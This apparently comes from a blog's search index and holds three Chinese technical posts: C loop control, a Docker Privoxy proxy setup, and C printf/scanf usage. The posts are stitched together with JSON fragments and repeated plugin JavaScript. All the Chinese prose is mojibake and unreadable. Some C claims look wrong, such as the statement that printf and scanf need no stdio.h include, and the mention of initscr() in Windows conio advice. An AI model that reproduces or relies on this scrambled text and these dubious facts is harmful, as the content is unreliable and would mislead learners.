å››ç§å¾ªç¯éƒ½å¯ä»¥ç”¨æ¥å¤„ç†åŒä¸€é—®é¢˜ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å®ƒä»¬å¯ä»¥äº’ç›¸ä»£æ›¿ï¼Œä½†ä¸€èˆ¬ä¸æå€¡ç”¨ goto å‹å¾ªç¯ åœ¨ while å¾ªç¯å’Œ do-while å¾ªç¯ä¸­ï¼Œéƒ½æ˜¯åœ¨ while åé¢çš„æ‹¬å·å†…æŒ‡å®šå¾ªç¯æ¡ä»¶ï¼Œå› æ­¤ä¸ºäº†ä½¿å¾ªç¯èƒ½æ­£å¸¸ç»“æŸï¼Œåº”åœ¨å¾ªç¯ä½“ä¸­åŒ…å«ä½¿å¾ªç¯è¶‹äºç»“æŸçš„è¯­å¥ (å¦‚ i++ï¼Œæˆ– i=i+1 ç­‰) for å¾ªç¯å¯ä»¥åœ¨è¡¨è¾¾å¼ 3 ä¸­åŒ…å«ä½¿å¾ªç¯è¶‹äºç»“æŸçš„æ“ä½œï¼Œç”šè‡³å¯ä»¥å°†å¾ªç¯ä½“ä¸­çš„æ“ä½œå…¨éƒ¨æ”¾åˆ°è¡¨è¾¾å¼ 3 ä¸­ï¼Œå› æ­¤ for è¯­å¥çš„åŠŸèƒ½æ›´å¼ºï¼›å‡¡æ˜¯ç”¨ while å¾ªç¯èƒ½å®Œæˆçš„åŠŸèƒ½ï¼Œfor å¾ªç¯éƒ½èƒ½å®ç° ç”¨ while å’Œ do-while å¾ªç¯æ—¶ï¼Œå¾ªç¯å˜é‡åˆå§‹åŒ–çš„æ“ä½œåº”åœ¨ while å’Œ do-while è¯­å¥ä¹‹å‰å®Œæˆï¼Œè€Œ for è¯­å¥å¯ä»¥åœ¨è¡¨è¾¾å¼ 1 ä¸­å®ç°å¾ªç¯å˜é‡çš„åˆå§‹åŒ– while å¾ªç¯ã€do-while å¾ªç¯å’Œ for å¾ªç¯ï¼Œéƒ½å¯ä»¥ç”¨ break è¯­å¥è·³å‡ºå¾ªç¯ï¼Œç”¨ continue è¯­å¥ç»“æŸæœ¬æ¬¡å¾ªç¯ï¼›è€Œå¯¹ç”¨ goto è¯­å¥å’Œ if è¯­å¥æ„æˆçš„å¾ªç¯ï¼Œä¸èƒ½ç”¨ break è¯­å¥å’Œ continue è¯­å¥è¿›è¡Œæ§åˆ¶ break è¯­å¥ break è¯­å¥å¯ä»¥ç”¨æ¥ä»å¾ªç¯ä½“å†…è·³å‡ºå¾ªç¯ä½“ï¼Œå³æå‰ç»“æŸå¾ªç¯ï¼Œç„¶åæ¥ç€æ‰§è¡Œå¾ªç¯ä¸‹é¢çš„è¯­å¥ï¼Œä¸€èˆ¬å½¢å¼ï¼šbreak; break è¯­å¥ä¸èƒ½ç”¨äºå¾ªç¯è¯­å¥å’Œ switch è¯­å¥ä¹‹å¤–çš„ä»»ä½•å…¶ä»–è¯­å¥ä¸­ break è¯­å¥å¯¹ if-else çš„æ¡ä»¶è¯­å¥ä¸èµ·ä½œç”¨ åœ¨å¤šå±‚å¾ªç¯ä¸­ï¼Œä¸€ä¸ª break è¯­å¥åªå‘å¤–è·³ä¸€å±‚ continue è¯­å¥ continue è¯­å¥çš„ä½œç”¨æ˜¯ç»“æŸæœ¬æ¬¡å¾ªç¯ï¼Œå³è·³è¿‡å¾ªç¯ä½“ä¸­ä¸‹é¢å°šæœªæ‰§è¡Œçš„è¯­å¥ï¼Œæ¥ç€è¿›è¡Œä¸‹ä¸€æ¬¡æ˜¯å¦æ‰§è¡Œå¾ªç¯çš„åˆ¤å®šã€‚ä¸€èˆ¬å½¢å¼ï¼šcontinue; continue è¯­å¥å’Œ break è¯­å¥çš„åŒºåˆ«æ˜¯ï¼Œcontinue è¯­å¥åªç»“æŸæœ¬æ¬¡å¾ªç¯ï¼Œè€Œä¸æ˜¯ç»ˆæ­¢æ•´ä¸ªå¾ªç¯çš„æ‰§è¡Œï¼›break è¯­å¥åˆ™æ˜¯ç»“æŸæ•´ä¸ªå¾ªç¯è¿‡ç¨‹ï¼Œä¸å†åˆ¤æ–­æ‰§è¡Œå¾ªç¯çš„æ¡ä»¶æ˜¯å¦æˆç«‹ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"cè¯­è¨€"},{title:"Docker å®‰è£… Privoxy ä»£ç†æœåŠ¡",url:"/posts/1b7c9c6f.html",text:'å®‰è£…ç¯å¢ƒ ç¯å¢ƒåç§° ç‰ˆæœ¬ linux CentOS Linux release 7.7.1908 (Core) docker-ce 19.03.8 docker-compose 1.24.0-rc1 docker image vimagick/privoxy:latest åˆå§‹ç›®å½•ç»“æ„ 12345~/fig/privoxy/â”œâ”€â”€ docker-compose.ymlâ””â”€â”€ privoxy/ â”œâ”€â”€ user.action â””â”€â”€ user.filter æ–‡ä»¶ï¼šdocker-compose.yml 123456789101112131415version: "3.5"services: privoxy: image: vimagick/privoxy:latest container_name: privoxy ports: - 8118:8118 volumes: - ./privoxy/user.action:/etc/privoxy/user.action - ./privoxy/user.filter:/etc/privoxy/user.filter cap_add: - NET_ADMIN restart: always æ–‡ä»¶ï¼šuser.action æ³¨æ„ï¼šä»¥ä¸‹çš„é…ç½®å†…å®¹ï¼Œä½œç”¨æ˜¯é˜»æ­¢ Privoxy æŒ‡å‘æœåŠ¡å™¨æœ¬èº«çš„ IP å’ŒåŸŸåï¼Œéœ€è¦æ›¿æ¢ä¸ºä½ è‡ªå·±æœåŠ¡å™¨çš„ IP å’ŒåŸŸåã€‚ 1234{+block{block ip and domain which point to server itself}}127.0.0.145.32.57.113.example.com æ–‡ä»¶ï¼šuser.filter è¯¥æ–‡ä»¶ç”¨äºå­˜æ”¾ Privoxy çš„è¿‡æ»¤è§„åˆ™ï¼Œæš‚æ—¶ä¸éœ€è¦å¡«å†™ä»»ä½•å†…å®¹ã€‚ å¯åŠ¨ Privoxy æœåŠ¡ 12345678910111213141516171819# è¿›å…¥ç›®æ ‡ç›®å½•# cd ~/fig/privoxy/# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker-compose up -d# æ‰“å°æ—¥å¿—ä¿¡æ¯$ docker-compose logs# è‹¥è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼Œåˆ™è¯´æ˜Privoxyçš„ä»£ç†æœåŠ¡å¯åŠ¨æˆåŠŸAttaching to privoxyprivoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Privoxy version 3.0.28privoxy | 2020-03-27 22:49:28.383 7f30fa6aed48 Info: Program name: privoxyprivoxy | 2020-03-27 22:49:28.384 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/default.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading filter file: /etc/privoxy/user.filterprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/match-all.actionprivoxy | 2020-03-27 22:49:28.386 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/default.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Loading actions file: /etc/privoxy/user.actionprivoxy | 2020-03-27 22:49:28.389 7f30fa6aed48 Info: Listening on port 8118 on IP address 0.0.0.0 åˆ›å»º Privoxy çš„ä¸»é…ç½®æ–‡ä»¶ 123456789101112131415161718192021222324# è¿›å…¥ç›®æ ‡ç›®å½•# cd ~/fig/privoxy# æ‹·è´å®¹å™¨ä¸­çš„configæ–‡ä»¶åˆ°æœ¬åœ°ç›®å½•ï¼ˆå‰ææ˜¯å®¹å™¨å·²æ­£å¸¸å¯åŠ¨ï¼‰# docker cp privoxy:/etc/privoxy/config ./privoxy/config# æ–‡ä»¶æˆæƒ# chmod 644 ./privoxy/config# ç¼–è¾‘docker-composeçš„é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹æ¥æŒ‚è½½æœ¬åœ°çš„configæ–‡ä»¶# vim docker-compose.ymlvolumes: - ./privoxy/config:/etc/privoxy/config# é‡å¯å®¹å™¨è®©é…ç½®å˜æ›´ç”Ÿæ•ˆ# docker-compose restart# æœ€ç»ˆçš„ç›®å½•ç»“æ„~/fig/privoxy/â”œâ”€â”€ docker-compose.ymlâ””â”€â”€ privoxy/ â”œâ”€â”€ config â”œâ”€â”€ user.action â””â”€â”€ user.filter é™åˆ¶è®¿é—® Privoxy ä»£ç†æœåŠ¡çš„ IPï¼ˆå¯é€‰æ­¥éª¤ï¼‰ 123456789# è¿›å…¥ç›®æ ‡ç›®å½•# cd ~/fig/privoxy# ç¼–è¾‘configæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ä¸€è¡Œå†…å®¹ï¼ˆIPéœ€è¦æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹ï¼‰# vim ./privoxy/configpermit-access 14.215.177.38/26# é‡å¯å®¹å™¨è®©é…ç½®å˜æ›´ç”Ÿæ•ˆ# docker-compose restart å¼€æ”¾é˜²ç«å¢™ç«¯å£ï¼ˆCentos7ï¼‰ 12345678# å¼€æ”¾Privoxyç›‘å¬çš„8118ç«¯å£# firewall-cmd --zone=public --permanent --add-port=8118/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports éªŒè¯ä»£ç†æœåŠ¡æ˜¯å¦å¯ç”¨ 12345678910111213141516# ç™»å½•å…¶ä»–Linuxç³»ç»Ÿ# æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè‹¥è¿”å›200çŠ¶æ€ç ï¼Œåˆ™è¯´æ˜ä»£ç†æœåŠ¡å¯ç”¨# curl -I -x 45.32.57.113:8118 www.baidu.comHTTP/1.1 200 OKAccept-Ranges: bytesCache-Control: private, no-cache, no-store, proxy-revalidate, no-transformConnection: keep-aliveContent-Length: 277Content-Type: text/htmlDate: Fri, 27 Mar 2020 01:40:09 GMTEtag: "575e1f60-115"Last-Modified: Mon, 13 Jun 2016 02:50:08 GMTPragma: no-cacheServer: bfe/1.0.8.18Proxy-Connection: keep-alive å‚è€ƒèµ„æ–™ vimagick/privoxy var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"C è¯­è¨€è¯­æ³•ä¹‹äºŒé¡ºåºç¨‹åºä¸åˆ†æ”¯ç»“æ„ç¨‹åºè®¾è®¡",url:"/posts/b27b9a6a.html",text:'èµ‹å€¼è¯­å¥ æ³¨æ„åœ¨å˜é‡å£°æ˜ä¸­ç»™å˜é‡èµ‹åˆå€¼å’Œèµ‹å€¼è¯­å¥çš„åŒºåˆ«ï¼Œç»™å˜é‡èµ‹åˆå€¼æ˜¯å˜é‡å£°æ˜çš„ä¸€éƒ¨åˆ†ï¼Œèµ‹åˆå€¼åçš„å˜é‡ä¸å…¶åçš„å…¶å®ƒåŒç±»å˜é‡ä¹‹é—´ä»å¿…é¡»ç”¨é€—å·é—´éš”ï¼Œè€Œèµ‹å€¼è¯­å¥åˆ™å¿…é¡»ç”¨åˆ†å·ç»“å°¾ï¼Œä¾‹å¦‚ï¼šint a=5,b,c; åœ¨å˜é‡å£°æ˜ä¸­ï¼Œä¸å…è®¸è¿ç»­ç»™å¤šä¸ªå˜é‡èµ‹åˆå€¼ï¼Œè€Œèµ‹å€¼è¯­å¥åˆ™å…è®¸è¿ç»­èµ‹å€¼ï¼Œå¦‚ int a=b=c=5; å£°æ˜æ˜¯é”™è¯¯çš„ï¼Œæ­£ç¡®çš„å†™æ³•å¿…é¡»æ˜¯ï¼šint a=5,b=5,c=5; æ³¨æ„èµ‹å€¼è¡¨è¾¾å¼å’Œèµ‹å€¼è¯­å¥çš„åŒºåˆ«ï¼Œèµ‹å€¼è¡¨è¾¾å¼æ˜¯ä¸€ç§è¡¨è¾¾å¼ï¼Œå®ƒå¯ä»¥å‡ºç°åœ¨ä»»ä½•å…è®¸è¡¨è¾¾å¼å‡ºç°çš„åœ°æ–¹ï¼Œè€Œèµ‹å€¼è¯­å¥åˆ™ä¸èƒ½ï¼Œå¦‚ if((x=y+5)&gt;0) z=x; è¯­å¥æ˜¯åˆæ³•çš„ï¼Œif((x=y+5;)&gt;0) z=x; è¯­å¥æ˜¯éæ³•çš„ï¼Œå› ä¸º x=y+5; æ˜¯è¯­å¥ï¼Œä¸èƒ½å‡ºç°åœ¨è¡¨è¾¾å¼ä¸­ putchar å‡½æ•°ä¸ getchar å‡½æ•° ä½¿ç”¨ putchar å’Œ getchar å‡½æ•°å‰ï¼Œéƒ½å¿…é¡»è¦ç”¨æ–‡ä»¶åŒ…å«å‘½ä»¤ #include &lt;stdio.h&gt; æˆ– #include â€œstdio.hâ€ putchar å‡½æ•°æ˜¯å­—ç¬¦è¾“å‡ºå‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯åœ¨æ˜¾ç¤ºå™¨ä¸Šè¾“å‡ºå•ä¸ªå­—ç¬¦ï¼Œå…¶ä¸€èˆ¬å½¢å¼ä¸ºï¼šputchar (å­—ç¬¦å˜é‡)ï¼Œå¦‚ putchar(\'A\'); getchar å‡½æ•°çš„åŠŸèƒ½æ˜¯ä»é”®ç›˜ä¸Šè¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œå…¶ä¸€èˆ¬å½¢å¼ä¸ºï¼šgetchar ()ï¼Œé€šå¸¸æŠŠè¾“å…¥çš„å­—ç¬¦èµ‹äºˆä¸€ä¸ªå­—ç¬¦å˜é‡æ¥æ„æˆèµ‹å€¼è¯­å¥ï¼Œå¦‚ï¼šchar c = getchar(); putch å‡½æ•°ä¸ getch å‡½æ•° getch å‡½æ•°æ˜¯ä¸€ä¸ªä¸å›æ˜¾å‡½æ•°ï¼Œå½“ç”¨æˆ·æŒ‰ä¸‹æŸä¸ªå­—ç¬¦æ—¶ï¼Œå‡½æ•°è‡ªåŠ¨è¯»å–ï¼Œæ— éœ€æŒ‰å›è½¦ï¼›æœ‰çš„ C è¯­è¨€å‘½ä»¤è¡Œç¨‹åºä¼šç”¨åˆ°æ­¤å‡½æ•°åšæ¸¸æˆï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°å¹¶éæ ‡å‡†å‡½æ•°ï¼Œè¦æ³¨æ„ä¸åŒå¹³å°çš„ç§»æ¤æ€§ Windows ç³»ç»Ÿä½¿ç”¨ putch å’Œ getch å‡½æ•°ï¼Œéœ€è¦å¼•å…¥ â€˜conio.hâ€™ å¤´æ–‡ä»¶ï¼›åœ¨ä½¿ç”¨ getch å‡½æ•°ä¹‹å‰è¦è°ƒç”¨ initscr()ï¼Œç»“æŸæ—¶è¦è°ƒç”¨ endwin()ï¼Œå¦åˆ™ä¼šå‡ºç°ä¸è¾“å…¥å­—ç¬¦è¿™ä¸ªå‡½æ•°ä¹Ÿä¼šæœ‰è¿”å›å€¼çš„æƒ…å†µ åœ¨ä¸åŒçš„ç³»ç»Ÿå¹³å°ï¼Œè¾“å…¥å›è½¦ï¼Œgetch å‡½æ•°å°†è¿”å›ä¸åŒæ•°å€¼ï¼Œè€Œ getchar å‡½æ•°ç»Ÿä¸€è¿”å›åè¿›åˆ¶æ•° 10 (å³ \\n) Linux ç³»ç»Ÿä¸å­˜åœ¨ conio.h å¤´æ–‡ä»¶ï¼Œä½†å¯ä»¥ä½¿ç”¨ curses åº“æ›¿ä»£ï¼›è‹¥åœ¨ç¼–è¯‘çš„æ—¶å€™ä¸é€šè¿‡ï¼Œgcc ç¼–è¯‘å‘½ä»¤éœ€è¦æ·»åŠ  -l curses å‚æ•°æ¥å¼•å…¥ curses åº“ã€‚Linux ç³»ç»Ÿä¸‹åªèƒ½ä½¿ç”¨ getch å‡½æ•°ï¼Œè€Œ putch å‡½æ•°ä¸èƒ½ä½¿ç”¨ï¼Œå› ä¸º curses åº“é‡Œæ²¡æœ‰ putch å‡½æ•° printf å‡½æ•°ï¼ˆæ ¼å¼è¾“å‡ºå‡½æ•°ï¼‰ printf å‡½æ•°ç§°ä¸ºæ ¼å¼è¾“å‡ºå‡½æ•°ï¼Œå…¶å…³é”®å­—æœ€æœ«ä¸€ä¸ªå­—æ¯ f å³ä¸º â€œæ ¼å¼â€(format) ä¹‹æ„ã€‚å…¶åŠŸèƒ½æ˜¯æŒ‰ç”¨æˆ·æŒ‡å®šçš„æ ¼å¼ï¼ŒæŠŠæŒ‡å®šçš„æ•°æ®æ˜¾ç¤ºåˆ°æ˜¾ç¤ºå™¨å±å¹•ä¸Šã€‚è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªæ ‡å‡†åº“å‡½æ•°ï¼Œå®ƒçš„å‡½æ•°åŸå‹åœ¨å¤´æ–‡ä»¶ stdio.h ä¸­ï¼Œä½†ä½œä¸ºä¸€ä¸ªç‰¹ä¾‹ï¼Œä¸è¦æ±‚åœ¨ä½¿ç”¨ printf å‡½æ•°ä¹‹å‰å¿…é¡»åŒ…å« stdio.h æ–‡ä»¶ï¼Œå…¶è°ƒç”¨çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šprintf (â€œæ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²â€ï¼Œè¾“å‡ºè¡¨åˆ—) å…¶ä¸­æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²ç”¨äºæŒ‡å®šè¾“å‡ºæ ¼å¼ï¼Œæ ¼å¼æ§åˆ¶ä¸²å¯ç”±æ ¼å¼å­—ç¬¦ä¸²å’Œéæ ¼å¼å­—ç¬¦ä¸²ä¸¤ç§ç»„æˆã€‚æ ¼å¼å­—ç¬¦ä¸²æ˜¯ä»¥ % å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œåœ¨ % åé¢è·Ÿæœ‰å„ç§æ ¼å¼å­—ç¬¦ï¼Œä»¥è¯´æ˜è¾“å‡ºæ•°æ®çš„ç±»å‹ã€å½¢å¼ã€é•¿åº¦ã€å°æ•°ä½æ•°ç­‰ï¼Œå¦‚ï¼š%c è¡¨ç¤ºæŒ‰å­—ç¬¦å‹è¾“å‡ºï¼Œ%d è¡¨ç¤ºæŒ‰åè¿›åˆ¶æ•´å‹è¾“å‡ºï¼Œ%f è¡¨ç¤ºæŒ‰å°æ•°å½¢å¼è¾“å‡ºå•ç²¾åº¦å®æ•° 1234i. ç±»å‹ï¼šå…·ä½“ç±»å‹å¦‚ä¸‹è¡¨æ‰€ç¤ºii. é•¿åº¦ï¼šé•¿åº¦æ ¼å¼ç¬¦ä¸ºhã€lä¸¤ç§ï¼Œhè¡¨ç¤ºæŒ‰çŸ­æ•´å‹é‡è¾“å‡ºï¼Œlè¡¨ç¤ºæŒ‰é•¿æ•´å‹é‡è¾“å‡ºiii. è¾“å‡ºæœ€å°å®½åº¦ï¼šç”¨åè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°‘ä½æ•°ï¼Œè‹¥å®é™…ä½æ•°å¤šäºå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®é™…ä½æ•°è¾“å‡ºï¼Œè‹¥å®é™…ä½æ•°å°‘äºå®šä¹‰çš„å®½åº¦åˆ™è¡¥ä»¥ç©ºæ ¼æˆ–0iiii. è¾“å‡ºç²¾åº¦ï¼šç²¾åº¦æ ¼å¼ç¬¦ä»¥`.`å¼€å¤´ï¼Œåé¢è·Ÿåè¿›åˆ¶æ•´æ•°ï¼Œæœ¬é¡¹çš„æ„ä¹‰æ˜¯å¦‚æœè¾“å‡ºæ•°å­—ï¼Œåˆ™è¡¨ç¤ºå°æ•°çš„ä½æ•°ï¼›å¦‚æœè¾“å‡ºçš„æ˜¯å­—ç¬¦ï¼Œåˆ™è¡¨ç¤ºè¾“å‡ºå­—ç¬¦çš„ä¸ªæ•°ï¼›è‹¥å®é™…ä½æ•°å¤§äºæ‰€å®šä¹‰çš„ç²¾åº¦æ•°ï¼Œåˆ™æˆªå»è¶…è¿‡çš„éƒ¨åˆ† 1234567891011/printfå‡½æ•°ä½¿ç”¨ä¾‹å­/int a = 15;char d = \'p\';int x = 88, y = 89;float b = 123.1234567;double c = 12345678.1234567;printf("%c,%c\\n",x,y); // &gt;&gt; X, Yprintf("a=%d,%5d,%o,%x\\n",a,a,a,a); // &gt;&gt; a=15, 15,17,fprintf("b=%f,%lf,%5.4lf,%e\\n",b,b,b,b); // &gt;&gt; b=123.123459,123.123459,123.1235,1.231235e+02printf("c=%lf,%f,%8.4lf\\n",c,c,c); // &gt;&gt; c=12345678.123457,12345678.123457,12345678.1235printf("d=%c,%8c\\n",d,d); // &gt;&gt; d=p, p scanf å‡½æ•°ï¼ˆæ ¼å¼è¾“å…¥å‡½æ•°ï¼‰ scanf å‡½æ•°ç§°ä¸ºæ ¼å¼è¾“å…¥å‡½æ•°ï¼Œå³æŒ‰ç”¨æˆ·æŒ‡å®šçš„æ ¼å¼ä»é”®ç›˜ä¸ŠæŠŠæ•°æ®è¾“å…¥åˆ°æŒ‡å®šçš„å˜é‡ä¹‹ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªæ ‡å‡†åº“å‡½æ•°ï¼Œå®ƒçš„å‡½æ•°åŸå‹åœ¨å¤´æ–‡ä»¶ stdio.h ä¸­ï¼Œä¸ printf å‡½æ•°ç›¸åŒï¼ŒC è¯­è¨€ä¹Ÿå…è®¸åœ¨ä½¿ç”¨ scanf å‡½æ•°ä¹‹å‰ä¸å¿…åŒ…å« stdio.h æ–‡ä»¶ã€‚scanf å‡½æ•°çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼šscanf (â€œæ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²â€ï¼Œåœ°å€è¡¨åˆ—)ï¼Œå…¶ä¸­æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²çš„ä½œç”¨ä¸ printf å‡½æ•°ç›¸åŒï¼Œå¦‚ï¼šint a,b; scanf("%d%d",&amp;a,&amp;b);ï¼Œä½†ä¸èƒ½æ˜¾ç¤ºéæ ¼å¼å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½æ˜¾ç¤ºæç¤ºå­—ç¬¦ä¸²ã€‚åœ°å€è¡¨åˆ—ä¸­ç»™å‡ºå„å˜é‡çš„åœ°å€ï¼Œåœ°å€æ˜¯ç”±åœ°å€è¿ç®—ç¬¦ &amp; åè·Ÿå˜é‡åç»„æˆï¼Œä¾‹å¦‚ï¼š&amp;aã€ &amp;b åˆ†åˆ«è¡¨ç¤ºå˜é‡ a å’Œå˜é‡ b çš„åœ°å€ æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š%[*][è¾“å…¥æ•°æ®å®½åº¦][é•¿åº¦] ç±»å‹ï¼Œå…¶ä¸­æœ‰æ–¹æ‹¬å· [ ] çš„é¡¹ä¸ºä»»é€‰é¡¹ï¼Œå„é¡¹çš„æ„ä¹‰å¦‚ä¸‹ï¼š1234i. *ç¬¦å·ï¼šç”¨ä»¥è¡¨ç¤ºè¯¥è¾“å…¥é¡¹è¯»å…¥åä¸èµ‹äºˆç›¸åº”çš„å˜é‡ï¼Œå³è·³è¿‡è¯¥è¾“å…¥å€¼ï¼Œä¾‹å¦‚: scanf("%d %*d %d", &amp;a, &amp;b)ï¼Œå½“è¾“å…¥ä¸ºï¼š1 2 3 æ—¶ï¼Œå°†æŠŠ1èµ‹äºˆaï¼Œ2è¢«è·³è¿‡ï¼Œ3èµ‹äºˆbi. å®½åº¦ï¼šç”¨åè¿›åˆ¶æ•´æ•°æŒ‡å®šè¾“å…¥çš„å®½åº¦(å³å­—ç¬¦æ•°)ï¼Œä¾‹å¦‚ï¼šscanf("%5d", &amp;a)ï¼Œå½“è¾“å…¥ä¸ºï¼š12345678ï¼ŒåªæŠŠ12345èµ‹äºˆå˜é‡aï¼Œå…¶ä½™éƒ¨åˆ†è¢«æˆªå»ï¼›åˆå¦‚ï¼šscanf("%4d%4d", &amp;a, &amp;b)ï¼Œå½“è¾“å…¥ä¸ºï¼š12345678ï¼Œå°†æŠŠ1234èµ‹äºˆaï¼Œè€ŒæŠŠ5678èµ‹äºˆbiii. é•¿åº¦ï¼šæ ¼å¼ç¬¦ä¸ºlå’Œhï¼Œhè¡¨ç¤ºè¾“å…¥çŸ­æ•´å‹æ•°æ®ï¼Œlè¡¨ç¤ºè¾“å…¥é•¿æ•´å‹æ•°æ®ï¼ˆå¦‚%ldï¼‰ å’ŒåŒç²¾åº¦æµ®ç‚¹æ•°ï¼ˆå¦‚%lfï¼‰iiii. ç±»å‹ï¼šè¡¨ç¤ºè¾“å…¥æ•°æ®çš„ç±»å‹ï¼Œå…¶æ ¼å¼ç¬¦å’Œæ„ä¹‰å’Œprintfå‡½æ•°ç›¸åŒï¼Œå¦‚ï¼šdè¡¨ç¤ºè¾“å…¥åè¿›åˆ¶æ•´æ•° ä½¿ç”¨ scanf å‡½æ•°å¿…é¡»æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š123456i. è‹¥è¾“å…¥çš„æ•°æ®ä¸è¾“å‡ºçš„ç±»å‹ä¸ä¸€è‡´æ—¶ï¼Œè™½ç„¶ç¼–è¯‘èƒ½å¤Ÿé€šè¿‡ï¼Œä½†è¾“å‡ºç»“æœå¯èƒ½ä¸æ­£ç¡®ii. scanfå‡½æ•°ä¸­æ²¡æœ‰ç²¾åº¦æ§åˆ¶ï¼Œå¦‚ï¼šscanf("%5.2f", &amp;a) æ˜¯éæ³•çš„ï¼Œä¸èƒ½ä¼å›¾ç”¨æ­¤è¯­å¥è¾“å…¥å°æ•°ä¸º2ä½çš„å®æ•°iii. scanfä¸­è¦æ±‚ç»™å‡ºå˜é‡åœ°å€ï¼Œå¦‚ç»™å‡ºå˜é‡ååˆ™ä¼šå‡ºé”™ï¼Œå¦‚ scanf("%d", a) æ˜¯éæ³•çš„ï¼Œåº”æ”¹ä¸º scanf("%d", &amp;a) æ‰æ˜¯åˆæ³•çš„iiii. åœ¨è¾“å…¥å¤šä¸ªæ•°å€¼æ•°æ®æ—¶ï¼Œè‹¥æ ¼å¼æ§åˆ¶ä¸²ä¸­æ²¡æœ‰éæ ¼å¼å­—ç¬¦ä½œä¸ºè¾“å…¥æ•°æ®ä¹‹é—´çš„é—´éš”ï¼Œåˆ™å¯ç”¨ç©ºæ ¼ã€TABæˆ–å›è½¦ä½œé—´éš”ï¼›Cç¼–è¯‘å™¨åœ¨ç¢°åˆ°ç©ºæ ¼ã€TABã€å›è½¦æˆ–éæ³•æ•°æ®ï¼ˆå¦‚å¯¹â€œ%dâ€è¾“å…¥â€œ12Aâ€ï¼ŒAå³ä¸ºéæ³•æ•°æ®ï¼‰æ—¶ï¼Œå³è®¤ä¸ºæ•°æ®è¾“å…¥ç»“æŸiiiii. å¦‚æœæ ¼å¼æ§åˆ¶ä¸²ä¸­æœ‰éæ ¼å¼å­—ç¬¦ï¼Œåˆ™è¾“å…¥æ—¶ä¹Ÿè¦è¾“å…¥è¯¥éæ ¼å¼å­—ç¬¦ï¼Œä¾‹å¦‚ï¼šscanf("%d,%d,%d", &amp;a, &amp;b, &amp;c)ï¼Œå…¶ä¸­ç”¨éæ ¼å¼ç¬¦â€œ,â€ä½œé—´éš”ç¬¦ï¼Œåˆ™è¾“å…¥æ•°æ®åº”ä¸ºï¼š5,6,7ï¼Œåˆå¦‚ï¼šscanf("a=%d,b=%d,c=%d", &amp;a, &amp;b, &amp;c)ï¼Œåˆ™è¾“å…¥æ•°æ®åº”ä¸ºï¼ša=5,b=6,c=7iiiiii. åœ¨è¾“å…¥å­—ç¬¦æ•°æ®æ—¶ï¼Œè‹¥æ ¼å¼æ§åˆ¶ä¸²ä¸­æ— éæ ¼å¼å­—ç¬¦ï¼Œåˆ™è®¤ä¸ºæ‰€æœ‰è¾“å…¥çš„å­—ç¬¦å‡ä¸ºæœ‰æ•ˆå­—ç¬¦ï¼Œå¦‚ï¼šscanf("%c%c%c", &amp;a, &amp;b, &amp;c)ï¼Œå½“è¾“å…¥ä¸ºï¼šd e fï¼Œåˆ™æŠŠ\'d\'èµ‹äºˆaï¼Œ\' \'èµ‹äºˆbï¼Œ\'e\'èµ‹äºˆcï¼Œåªæœ‰å½“è¾“å…¥ä¸ºï¼šdef 